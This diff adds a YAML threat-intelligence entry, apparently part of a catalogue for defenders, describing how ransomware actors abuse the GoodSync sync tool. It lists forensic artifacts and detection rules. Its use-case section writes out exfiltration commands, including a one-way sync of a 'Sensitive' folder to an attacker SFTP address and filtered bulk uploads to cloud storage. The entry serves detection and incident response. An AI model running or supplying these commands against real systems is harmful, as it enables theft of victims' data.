@@ -1,0 +1,137 @@
+Name: GoodSync
+Description: >
+  Commercial file synchronization and backup tool supporting local-to-remote and cloud-based
+  transfers. GoodSync offers GUI and CLI execution, can run scheduled or silent sync tasks,
+  and has been abused by ransomware operators to exfiltrate large volumes of data to
+  attacker-controlled cloud storage such as Backblaze, Google Drive, or SFTP servers.
+
+Category: 3rd-party
+Platform:
+- Windows
+- Linux
+- macOS
+
+Execution:
+- gui
+- cli
+
+Capabilities:
+- file-synchronization   # Core functionality; syncs files between local and remote destinations.
+- recursive-upload       # Sync jobs can recursively upload entire directory trees.
+- cloud-upload           # Supports multiple cloud backends (Backblaze, Google Drive, OneDrive, S3-compatible).
+- sftp-upload            # Exfiltration via SFTP endpoints controlled by the attacker.
+- file-filtering         # Include/exclude rules to target specific file types or recently modified files.
+- scheduled-execution    # Automated sync jobs that run periodically without user interaction.
+- quiet-execution        # Sync tasks can run silently with minimal GUI evidence.
+- background-execution   # Jobs run in the background once configured; no active user session required.
+- credential-storage     # GoodSync stores hashed/encoded credentials in TIC files.
+- persistent-jobs        # Sync jobs are saved as persistent configuration files (TIC).
+
+Forensics:
+  BinaryLocations:
+  - "C:\\Program Files\\GoodSync\\GoodSync.exe"
+  - "C:\\Program Files\\GoodSync\\gsync.exe"
+  - "/usr/bin/gsync"
+  - "/usr/local/bin/gsync"
+  FileNamePatterns:
+  - GoodSync\.exe
+  - gsync\.exe
+  - GoodSync-.+\.log
+  CommandLineArgs:
+    Description: These flags and patterns have been observed in malicious exfiltration scenarios.
+    Indicators:
+    - gsync sync            # CLI-driven sync operation used for silent bulk exfiltration.
+    - /analyse              # Scans directories before sync; used by actors to preview files.
+    - /dir                  # Specifies the sync job directory (source/target pair).
+    - /exclude              # Excludes large/unwanted files; reduces noise and volume.
+    - /include              # Targets specific formats (.pdf, .docx, .csv) for selective exfiltration.
+    - /oneway               # Ensures local → remote upload without receiving files.
+    - /contact              # Specifies remote storage endpoint definitions.
+  NetworkArtifacts:
+    Description: Traffic patterns and destinations associated with GoodSync remote sync.
+    Indicators:
+    - "*.backblaze.com"
+    - "api.backblazeb2.com"
+    - "drive.google.com"
+    - "*.onedrive.com"
+    - "sftp://<attacker-ip>/"
+    - "webdav://<domain>/"
+  ConfigFiles:
+  - "%AppData%\\Local\\GoodSync\\server-accounts.tic"
+  - "%AppData%\\Local\\GoodSync\\GsAcct.tic"
+  - "%AppData%\\Local\\GoodSync\\jobs-groups-options-*.tic"
+  - "%AppData%\\Local\\GoodSync\\GoogleDriveCache\\google-fs-cache.tic"
+  RegistryPersistence:
+  - "HKCU\\Software\\GoodSync"
+  - "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\GoodSync*"
+  LogFiles:
+  - "%AppData%\\Local\\GoodSync\\log\\GoodSync-YYYYMMDD-HHmm.log"
+  ScheduledTask: []  # GoodSync can create jobs internally, not as Windows scheduled tasks unless misused.
+
+ThreatActors:
+- ransomware
+
+UseCases:
+  - Title: Bulk directory exfiltration to cloud storage
+    Description: >
+      Threat actors configure a GoodSync sync job pointing to Backblaze or other cloud storage,
+      recursively uploading hundreds of gigabytes of victim data. Observed in Chaos and 3AM ransomware.
+    Command: gsync sync /dir "C:\Data" /oneway /contact backblaze-profile
+
+  - Title: Silent CLI-based exfiltration
+    Description: >
+      Uses `gsync.exe` instead of the GUI, allowing entirely silent execution and easier scripting
+      via loaders or remote shells.
+    Command: gsync sync /dir "/home/user/Documents" /oneway
+
+  - Title: Targeted exfiltration via filtering
+    Description: >
+      Attackers apply include/exclude rules to extract only valuable data types and reduce detection
+      by avoiding unnecessary uploads.
+    Command: gsync sync /dir "C:\Users\Admin" /include="*.pdf" /exclude="*.iso"
+
+  - Title: SFTP-based exfiltration to attacker infrastructure
+    Description: >
+      Sync job configured to upload data to an attacker-controlled SFTP server, evading cloud-focused
+      detections and making domain/IP attribution more difficult.
+    Command: gsync sync /dir "C:\Sensitive" /contact "sftp://192.168.1.10/exfil/"
+
+  - Title: Automated persistent sync job
+    Description: >
+      A GoodSync job saved in TIC configuration runs regularly, exfiltrating new or modified files
+      without manual execution.
+    Command: N/A  # Triggered by internal scheduled sync engine
+
+Detection:
+  - Type: Suspicious Sync Job Creation
+    Description: >
+      Detect creation or modification of GoodSync TIC files referencing new cloud or SFTP accounts,
+      especially on systems where GoodSync is not typically used.
+
+  - Type: CLI Execution from Unusual Parents
+    Description: >
+      Alert when gsync.exe is spawned by PowerShell, mshta, wscript, psexec, or remote execution tools.
+
+  - Type: Large Outbound Transfers to Cloud Storage
+    Description: >
+      Monitor high-volume uploads to Backblaze, Google Drive, or uncommon S3-compatible endpoints
+      originating from servers or desktops that do not normally perform backups.
+
+  - Type: Silent Background Syncing
+    Description: >
+      Detect gsync.exe executing without GUI interaction, especially combined with `/oneway` or filtering flags.
+
+  - Type: Exfiltration via SFTP/WebDAV
+    Description: >
+      Unusual outbound SFTP/WebDAV connections from non-backup systems can indicate malicious usage.
+
+Testing:
+  - https://www.synacktiv.com/en/publications/legitimate-exfiltration-tools-summary-and-detection-for-incident-response-and-threat
+
+References:
+- https://blog.talosintelligence.com/new-chaos-ransomware/
+- https://news.sophos.com/en-us/2025/05/20/a-familiar-playbook-with-a-twist-3am-ransomware-actors/
+- https://thehackernews.com/2025/07/chaos-raas-emerges-after-blacksuit.html
+- https://www.synacktiv.com/en/publications/legitimate-exfiltration-tools-summary-and-detection-for-incident-response-and-threat
+
+LastModified: '2025-11-19'
